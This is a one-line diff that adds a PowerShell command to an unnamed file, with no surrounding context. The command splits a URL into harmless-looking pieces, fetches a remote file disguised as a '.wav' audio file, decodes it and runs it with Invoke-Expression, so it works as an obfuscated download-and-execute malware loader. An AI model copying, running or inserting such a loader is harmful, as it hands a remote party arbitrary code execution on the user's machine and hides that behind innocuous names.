@@ -1,0 +1,1 @@
+powershell -Command "$gateway='https://';$marketNode='dev';$stream='-featured';$zone='.app';$patch='qqwwe.wav';$updateURL=$gateway + $marketNode + $stream + $zone + '/' + $patch;iex ([Text.Encoding]::UTF8.GetString((iwr $updateURL -UseBasicParsing).Content))"
